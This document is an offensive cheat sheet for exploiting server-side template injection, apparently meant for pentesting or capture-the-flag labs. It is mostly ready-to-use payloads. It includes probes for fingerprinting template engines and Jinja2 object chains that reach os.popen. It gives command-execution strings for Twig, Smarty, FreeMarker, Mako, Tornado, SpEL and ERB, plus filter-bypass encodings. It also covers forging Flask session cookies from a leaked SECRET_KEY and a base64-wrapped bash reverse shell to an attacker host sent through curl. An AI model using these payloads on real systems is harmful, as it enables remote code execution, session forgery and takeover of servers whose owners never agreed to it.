# Server-side template injection (SSTI)

Check previews, email/PDF templates, CMS content, greetings.

## First check
```bash
curl -sG 'http://<IP>/preview' --data-urlencode 'name=probe-plain-end'
curl -sG 'http://<IP>/preview' --data-urlencode 'name=probe-{{7*7}}-end'
curl -sG 'http://<IP>/preview' --data-urlencode 'name=probe-{{7*8}}-end'
curl -sG 'http://<IP>/preview' --data-urlencode $'name=${{<%[%\'"}}%\\.'
```
Expect `probe-49-end`, `probe-56-end`. The last line is the polyglot: a 500 / template error = engine parses your input.

| Probe | Engine |
| --- | --- |
| `{{7*7}}` | Jinja2, Twig, Tornado, other curly-brace |
| `{{7*'7'}}` | Jinja2 → `7777777`; Twig → `49` |
| `${7*7}` | FreeMarker, Mako, SpEL, other dollar-expression |
| `#{7*7}` | Thymeleaf |
| `{$smarty.version}` | Smarty → version string |
| `<%= 7*7 %>` | ERB, other tag-based |

## Jinja2 (Flask): enumerate
```text
{{ config }}
{{ config.items() }}
{{ self.__init__.__globals__.__builtins__ }}
```
- `SECRET_KEY` in config → forge Flask session cookies (`flask-unsign`).

## Jinja2: command execution
```text
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ joiner.__init__.__globals__.os.popen('id').read() }}
{{ namespace.__init__.__globals__.os.popen('id').read() }}
{{ lipsum.__globals__["os"].popen('id').read() }}
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```
- One object blocked/undefined → try the next; all reach `os`.

## Jinja2: reverse shell (no quoting pain)
Base64 the shell so no `&`, `>`, or quotes reach the template.
```bash
echo -n 'bash -i >& /dev/tcp/<KALI>/443 0>&1' | base64 -w0          # → <B64>
curl -sG 'http://<IP>/preview' --data-urlencode "name={{ cycler.__init__.__globals__.os.popen('echo <B64>|base64 -d|bash').read() }}"
```
- Always send the payload with `--data-urlencode` (or Burp "URL-encode key chars"): a raw `&` / `+` in the URL splits or mangles the parameter.
- The request hangs while the shell is open: expected.
- POST form: drop `-G`. JSON body: escape the inner `"` or keep only single quotes inside.

## Jinja2: filter bypass
```text
{{ lipsum.__globals__.os.popen(request.args.c).read() }}          + &c=id
{{ request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')() }}
{{ request|attr(["__","class","__"]|join) }}
```
- `request.args.X` moves blocked strings (quotes, command) into another GET parameter.
- `_` blocked → `\x5f`; `.` blocked → `|attr('name')`; `[]` blocked → `|attr('__getitem__')`.

## Other engines: command execution
```text
Twig:        {{ ['id']|filter('system') }}
Twig:        {{ ['id']|map('system')|join }}
Twig 1.x:    {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
Smarty:      {system('id')}
FreeMarker:  ${"freemarker.template.utility.Execute"?new()("id")}
Mako:        ${self.module.cache.util.os.system("id")}
Tornado:     {% import os %}{{ os.popen('id').read() }}
SpEL:        ${T(java.lang.Runtime).getRuntime().exec('id')}
ERB:         <%= `id` %>
ERB:         <%= IO.popen('id').readlines() %>
```
- Sandbox/context may block these. Judge by raw response, not browser DOM.
- Blind (Mako `os.system`, SpEL `exec`): prove with `ping -c1 <KALI>` + `sudo tcpdump -i tun0 icmp`, then go straight to the base64 reverse shell.
